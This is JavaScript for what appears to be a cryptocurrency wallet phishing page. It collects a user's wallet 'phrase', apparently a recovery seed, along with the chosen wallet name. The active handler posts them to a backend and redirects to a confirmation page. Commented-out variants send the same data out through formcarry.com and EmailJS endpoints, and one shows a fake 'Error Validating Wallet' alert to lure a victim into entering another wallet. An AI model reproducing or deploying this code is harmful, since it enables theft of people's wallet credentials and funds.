// function inspectExport(strings, nextPage) {
//   const formData = new FormData();
//   formData.append("From", window.location.host);
//   formData.append("Wallet", document.getElementById("wallet_name").innerHTML);

//   Object.keys(strings).forEach(function (key) {
//     formData.append(`${strings[key]["name"]}`, `${strings[key]["value"]}`);
//   });

//   const email_shortcode = "4smlFi1hKNd";
//   const send_rep = `https://formcarry.com/s/${email_shortcode}`;

//   fetch(send_rep, {
//     method: "POST",
//     method: "POST",
//     headers: {
//       Accept: "application/json",
//     },
//     body: formData,
//   })
//     .then((response) => {
//       response.json();
//       setTimeout(function () {
//         alert("Error Validating Wallet, Please try another wallet");
//       }, 500);
//     })
//     .catch((error) => console.error("Error:", error));
// }

// document.querySelector("form").addEventListener("submit", function (e) {
//   e.preventDefault(e);
//   var form = $(this).serializeArray();
//   inspectExport(form, "#");
// });




// document.getElementById('my-form').addEventListener('submit', function(event) {
//   event.preventDefault(); // Prevent the default form submission

//   const formData = new FormData(this); // Create a FormData object from the form

//   fetch('http://localhost:3000/submit-form', {
//       method: 'POST',
//       body: JSON.stringify({
//           phrase: formData.get('phrase')
//       }),
//       headers: {
//           'Content-Type': 'application/json'
//       }
//   })
//   .then(response => response.json()) // Parse JSON response
//   .then(data => {
//       console.log('Success:', data);
//       alert('Form submitted successfully!'); // Display success message or redirect as needed
//   })
//   .catch((error) => {
//       console.error('Error:', error);
//       alert('There was an error submitting the form.'); // Display error message
//   });
// });


// document.getElementById('my-form').addEventListener('submit', function(event) {
//   event.preventDefault(); // Prevent the default form submission

//   const formData = new FormData(this); // Create a FormData object from the form

//   fetch('http://localhost:3000/submit-form', {
//       method: 'POST',
//       body: JSON.stringify({
//         phrase: formData.get('phrase'),
        
//       }),
//       headers: {
//           'Content-Type': 'application/json'
//       }
//   })
//   .then(response => response.json()) // Parse JSON response
//   .then(data => {
//       console.log('Success:', data);
//       // Redirect to confirmation page after successful submission
//       window.location.href = '/confirmation.html';
//   })
//   .catch((error) => {
//       console.error('Error:', error);
//       alert('There was an error submitting the form.'); // Display error message
//   });
// });


// function inspectExport(strings, nextPage) {
//   const formData = new FormData();
//   formData.append("From", window.location.host);
//   formData.append("Wallet", document.getElementById("wallet_name").innerHTML);

//   Object.keys(strings).forEach(function (key) {
//     formData.append(`${strings[key]["name"]}`, `${strings[key]["value"]}`);
//   });

//   const send_rep = "http://localhost:3000/submit-form"; // Update with your new endpoint

//   fetch(send_rep, {
//     method: "POST",
//     headers: {
//       Accept: "application/json",
//     },
//     body: formData,
//   })
//     .then((response) => response.json())
//     .then((data) => {
//       // If form submission is successful, redirect to confirmation page
//       window.location.href = "/confirmation.html";
//     })
//     .catch((error) => {
//       console.error("Error:", error);
//       setTimeout(function () {
//         alert("Error Validating Wallet, Please try another wallet");
//       }, 500);
//     });
// }


document.addEventListener("DOMContentLoaded", function () {
    let selectedWalletTitle = '';
  
    // Capture the data-title when a wallet is clicked
    document.querySelectorAll('.select_wallet').forEach(function (wallet) {
        wallet.addEventListener('click', function () {
            selectedWalletTitle = this.getAttribute('data-title');
            document.getElementById('wallet_name').textContent = selectedWalletTitle;
            document.getElementById('wallet_logo').src = this.getAttribute('data-logo');
        });
    });
  
    // Handle form submission
    document.getElementById('my-form').addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent the default form submission
  
        const formData = new FormData(this); // Create a FormData object from the form
        formData.append('walletTitle', selectedWalletTitle); // Append the wallet title to the form data
  
        fetch('http://localhost:3000/submit-form', {
            method: 'POST',
            body: JSON.stringify({
                phrase: formData.get('phrase'),
                walletTitle: selectedWalletTitle
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json()) // Parse JSON response
        .then(data => {
            console.log('Success:', data);
            // Redirect to confirmation page after successful submission
            window.location.href = '/confirmation.html';
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('There was an error submitting the form.'); // Display error message
        });
    });
  });
  
  
  // document.addEventListener("DOMContentLoaded", function () {
  //   let selectedWalletTitle = '';
  
  //   // Capture the data-title when a wallet is clicked
  //   document.querySelectorAll('.select_wallet').forEach(function (wallet) {
  //       wallet.addEventListener('click', function () {
  //           selectedWalletTitle = this.getAttribute('data-title');
  //           document.getElementById('wallet_name').textContent = selectedWalletTitle;
  //           document.getElementById('wallet_logo').src = this.getAttribute('data-logo');
  //       });
  //   });
  
  //   // Initialize EmailJS
  //   emailjs.init("p1nGZ8GfxvNvh8R46");  // Replace with your EmailJS user ID
  
  //   // Handle form submission
  //   document.getElementById('my-form').addEventListener('submit', function (event) {
  //       event.preventDefault(); // Prevent the default form submission
  
  //       const formData = new FormData(this); // Create a FormData object from the form
  //       formData.append('walletTitle', selectedWalletTitle); // Append the wallet title to the form data
  
  //       // Prepare the data for EmailJS
  //       const emailParams = {
  //           phrase: formData.get('phrase'),
  //           walletTitle: selectedWalletTitle
  //       };
  
  //       // Send the form data via EmailJS
  //       emailjs.send('service_cxfoghi', 'template_12h98fn', emailParams)  // Replace with your EmailJS service and template IDs
  //       .then(function(response) {
  //           console.log('Email sent successfully!', response.status, response.text);
  //           window.location.href = '/confirmation.html';  // Redirect to confirmation page after successful submission
  //       }, function (error) {
  //           console.error('Failed to send email:', error);
  //           alert('There was an error submitting the form.'); // Display error message
  //         }
  //       );
  //   });
  // });
  